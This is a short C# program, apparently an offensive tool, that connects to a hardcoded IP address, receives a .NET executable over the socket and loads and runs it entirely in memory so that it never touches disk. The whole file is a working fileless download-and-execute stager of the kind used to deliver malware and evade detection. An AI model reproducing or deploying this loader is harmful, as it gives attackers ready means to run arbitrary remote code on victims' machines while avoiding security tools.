// Author: Sayan Ray (@barebones90)

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.Reflection;

/*
 * This program can take the contents of any dotnet compiled "exe" file, in a byte array and execute it without saving it to disk.
 *

*/

class Program {

	static void ExecExe(byte[] exe) {
		Assembly assm = Assembly.Load(exe);
		MethodInfo entryPoint = assm.EntryPoint;

		if (entryPoint != null) {

			// check if Main Method accepts parameters or not
			if (entryPoint.GetParameters().Length == 0) {
				// no parameters
				entryPoint.Invoke(null, null);
			} else {
				// accepts parameters, invoke with an empty string array.
				entryPoint.Invoke(null, new object[] { new string[] { } });
			}
		} else
			Console.WriteLine("No entry point found in the exe file.");
	}

	static void Main(string[] args) {
		string addr = "192.168.51.75";
		int port = 80;
		// Create our tcp client

		TcpClient client = new TcpClient(addr, port);
		Stream s = client.GetStream();

		byte[] buf = new byte[65565];
		int k = s.Read(buf, 0, 65565);

		// buf has the contents of the exe file

		client.Close();
		ExecExe(buf);
	}
}
